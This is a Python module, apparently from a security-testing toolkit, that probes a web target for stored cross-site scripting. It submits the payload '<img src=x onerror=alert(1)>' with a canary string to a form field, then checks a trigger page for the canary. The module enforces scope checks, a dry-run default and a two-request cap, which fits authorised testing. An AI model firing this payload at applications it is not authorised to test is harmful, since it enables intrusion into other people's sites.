"""Capped second-order / stored XSS: inject canary then hit a trigger URL."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

CANARY = "hackbotSOXSS1337"
STORE_PROBE = f'<img src=x onerror=alert(1)>{CANARY}'


def second_order_xss(
    target_dir: Path,
    store_url: str,
    *,
    trigger_url: str = "",
    param: str = "comment",
    method: str = "POST",
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
    session: str = "",
) -> RunnerResult:
    """
    Cap: 1 store request + 1 trigger GET. Never unbounded crawl.
    Signal if canary appears on trigger page after inject.
    """
    require_in_scope(target_dir, store_url, action="second-order xss store", force=force)
    trigger = trigger_url or store_url
    require_in_scope(target_dir, trigger, action="second-order xss trigger", force=force)
    plan = {
        "store_url": store_url,
        "trigger_url": trigger,
        "param": param,
        "method": method.upper(),
        "canary": CANARY,
        "approve": approve,
        "capped": True,
    }
    ui.code_panel(json.dumps(plan, indent=2), title="second_order_xss", lexer="json")
    cmd = ["second_order_xss", store_url, trigger]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    headers = {"User-Agent": "hackbot-second-order-xss", "Content-Type": "application/x-www-form-urlencoded"}
    if session:
        try:
            from ..identity import load_identity

            auth = load_identity(target_dir).merge_headers(session)
            headers.update(auth)
        except Exception:  # noqa: BLE001
            pass

    from ..scoped_http import scoped_fetch_bytes

    # Store
    store_status = 0
    try:
        store_full = store_url if "://" in store_url else f"https://{store_url}"
        if method.upper() == "GET":
            parsed = urllib.parse.urlparse(store_full)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [STORE_PROBE]
            probe = urllib.parse.urlunparse(
                (
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    "",
                    urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs.items()}),
                    "",
                )
            )
            resp = scoped_fetch_bytes(
                probe,
                target_dir=target_dir,
                action="second-order xss store",
                force=force,
                timeout=timeout,
                headers={"User-Agent": headers.get("User-Agent", "hackbot-second-order-xss")},
                max_bytes=50_000,
                gate_initial=False,
            )
        else:
            body = urllib.parse.urlencode({param: STORE_PROBE}).encode("utf-8")
            resp = scoped_fetch_bytes(
                store_full,
                target_dir=target_dir,
                action="second-order xss store",
                force=force,
                timeout=timeout,
                method=method.upper(),
                data=body,
                headers=headers,
                max_bytes=50_000,
                gate_initial=False,
            )
        store_status = resp.status
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd,
            True,
            1,
            json.dumps({"ok": False, "signal": False, "error": f"{type(exc).__name__}: {exc}"}),
            "",
            "error",
        )

    # Trigger
    trigger_status = 0
    reflected = False
    preview = ""
    try:
        resp = scoped_fetch_bytes(
            trigger if "://" in trigger else f"https://{trigger}",
            target_dir=target_dir,
            action="second-order xss trigger",
            force=force,
            timeout=timeout,
            headers={"User-Agent": "hackbot-second-order-xss"},
            max_bytes=120_000,
            gate_initial=False,
        )
        trigger_status = resp.status
        body_t = resp.body.decode("utf-8", errors="replace")
        reflected = CANARY in body_t
        preview = redact_text(body_t[:240])
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd,
            True,
            1,
            json.dumps({"ok": False, "signal": False, "store_status": store_status, "error": type(exc).__name__}),
            "",
            "error",
        )

    out: dict[str, Any] = {
        "ok": True,
        "signal": reflected,
        "reason": "stored canary on trigger" if reflected else "no stored reflection",
        "store_status": store_status,
        "trigger_status": trigger_status,
        "canary": CANARY,
        "preview": preview,
    }
    return RunnerResult(cmd, True, 0, json.dumps(out), "", "executed")
